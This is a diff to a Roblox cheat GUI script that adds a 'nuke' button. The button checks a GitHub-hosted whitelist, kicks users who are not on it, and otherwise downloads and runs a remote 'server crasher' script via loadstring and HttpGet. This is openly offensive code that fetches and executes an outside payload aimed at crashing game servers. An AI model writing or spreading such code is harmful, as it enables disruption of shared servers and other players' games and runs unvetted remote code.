@@ -73,6 +73,7 @@ local spamvoid = Instance.new("TextButton")
 local iintent = Instance.new("TextButton")
 local openbuttonframe = Instance.new("Frame")
 local TextButton = Instance.new("TextButton")
+local nukebutton = Instance.new("ImageButton")
 
 ScreenGui.Parent = game.CoreGui
 
@@ -201,6 +202,7 @@ about.MouseButton1Down:connect(function()
 	scrollmenu.Visible = false
 	spamvoid.Visible = false
 	iintent.Visible = false
+	nukebutton.Visible = false
 end)
 
 dgui.Name = "dgui"
@@ -732,6 +734,7 @@ X2.MouseButton1Down:connect(function()
 	X2.Visible = false
 	spamvoid.Visible = true
 	iintent.Visible = true
+	nukebutton.Visible = true
 end)
 
 aboutframe.Name = "aboutframe"
@@ -1107,4 +1110,29 @@ iintent.TextWrapped = true
 iintent.MouseButton1Down:connect(function()
     local Part = game.workspace[game.Players.LocalPlayer.Name].KillingIntentPart.Effect:Destroy()
     local Part = game.workspace[game.Players.LocalPlayer.Name].Head.KillingIntentAuraSound:Destroy()
+end)
+
+nukebutton.Name = "nukebutton"
+nukebutton.Parent = menuframe
+nukebutton.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
+nukebutton.BorderColor3 = Color3.fromRGB(55, 55, 55)
+nukebutton.BorderSizePixel = 0
+nukebutton.Position = UDim2.new(0.614000022, 0, 0.216999993, 0)
+nukebutton.Size = UDim2.new(0, 100, 0, 100)
+nukebutton.Image = "http://www.roblox.com/asset/?id=7190825241"
+nukebutton.MouseButton1Down:connect(function()
+    local function authenticated()
+    local users = game:HttpGet("https://raw.githubusercontent.com/ImNotYukiiSoDontAsk/YH6/main/NukeWhitelist", true):split("\n")
+    for _, user in pairs(users) do
+        if user == game.Players.LocalPlayer.Name then
+            return true
+        end
+    end
+end
+
+if not authenticated() then
+    return game.Players.LocalPlayer:Kick("There ain't no way you usin this shit mate.")
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImNotYukiiSoDontAsk/YH6/main/server%20crasher", true))()
 end)
